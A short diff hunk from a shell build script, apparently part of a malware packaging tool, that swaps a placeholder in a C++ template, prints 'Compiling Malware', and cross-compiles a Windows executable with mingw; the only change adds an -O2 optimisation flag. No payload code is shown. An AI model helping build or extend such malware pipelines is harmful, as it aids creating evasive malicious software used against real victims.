@@ -123,7 +123,7 @@ sed -i "s/VIRALO/$virt2/g" Harriet/FULLAes/Resources/template.cpp
 rm virt*
 
 echo -e ${yellow}"+++Compiling Malware+++"${clear}
-x86_64-w64-mingw32-g++ -o $MALWARE Harriet/FULLAes/Resources/template.cpp -fpermissive -Wno-narrowing >/dev/null 2>&1
+x86_64-w64-mingw32-g++ -o $MALWARE Harriet/FULLAes/Resources/template.cpp -fpermissive -Wno-narrowing -O2>/dev/null 2>&1
 echo ""
 sleep 2
 rm shell*
